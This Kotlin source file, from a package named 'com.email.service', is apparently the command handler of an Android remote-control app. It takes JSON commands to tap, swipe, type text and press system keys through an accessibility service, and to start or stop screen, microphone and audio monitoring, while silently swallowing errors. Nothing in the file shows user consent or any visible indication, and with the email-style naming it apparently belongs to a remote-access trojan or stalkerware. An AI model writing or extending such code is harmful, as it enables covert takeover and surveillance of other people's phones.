package com.email.service

import android.content.Context
import android.content.Intent
import com.email.accessibility.RemoteAccessibilityService
import org.json.JSONObject

object RemoteControlService {

    fun handleControlJson(context: Context, json: String) {
        try {
            val obj = JSONObject(json)
            val action = obj.optString("action", "")

            when (action) {
                "TAP" -> {
                    val x = obj.getDouble("x").toFloat()
                    val y = obj.getDouble("y").toFloat()
                    RemoteAccessibilityService.instance?.performTap(x, y)
                }
                "SWIPE" -> {
                    val x1 = obj.getDouble("x1").toFloat()
                    val y1 = obj.getDouble("y1").toFloat()
                    val x2 = obj.getDouble("x2").toFloat()
                    val y2 = obj.getDouble("y2").toFloat()
                    val duration = obj.optLong("duration", 300)
                    RemoteAccessibilityService.instance?.performSwipe(x1, y1, x2, y2, duration)
                }
                "SCROLL" -> {
                    val x1 = obj.getDouble("x1").toFloat()
                    val y1 = obj.getDouble("y1").toFloat()
                    val x2 = obj.getDouble("x2").toFloat()
                    val y2 = obj.getDouble("y2").toFloat()
                    val duration = obj.optLong("duration", 500)
                    RemoteAccessibilityService.instance?.performSwipe(x1, y1, x2, y2, duration)
                }
                "KEY_BACK" -> {
                    RemoteAccessibilityService.instance?.performBack()
                }
                "KEY_HOME" -> {
                    RemoteAccessibilityService.instance?.performHome()
                }
                "KEY_RECENTS" -> {
                    RemoteAccessibilityService.instance?.performRecents()
                }
                "TYPE_TEXT" -> {
                    val text = obj.optString("text", "")
                    RemoteAccessibilityService.instance?.typeText(text)
                }
                "START_SCREEN" -> {
                    val intent = Intent(context, RemoteMonitorService::class.java).apply {
                        this.action = RemoteMonitorService.ACTION_START_SCREEN
                    }
                    context.startService(intent)
                }
                "STOP_SCREEN" -> {
                    val intent = Intent(context, RemoteMonitorService::class.java).apply {
                        this.action = RemoteMonitorService.ACTION_STOP_SCREEN
                    }
                    context.startService(intent)
                }
                "START_MIC" -> {
                    val intent = Intent(context, RemoteMonitorService::class.java).apply {
                        this.action = RemoteMonitorService.ACTION_START_MIC
                    }
                    context.startService(intent)
                }
                "STOP_MIC" -> {
                    val intent = Intent(context, RemoteMonitorService::class.java).apply {
                        this.action = RemoteMonitorService.ACTION_STOP_MIC
                    }
                    context.startService(intent)
                }
                "START_AUDIO" -> {
                    val intent = Intent(context, RemoteMonitorService::class.java).apply {
                        this.action = RemoteMonitorService.ACTION_START_AUDIO
                    }
                    context.startService(intent)
                }
                "STOP_AUDIO" -> {
                    val intent = Intent(context, RemoteMonitorService::class.java).apply {
                        this.action = RemoteMonitorService.ACTION_STOP_AUDIO
                    }
                    context.startService(intent)
                }
            }
        } catch (_: Exception) {}
    }
}
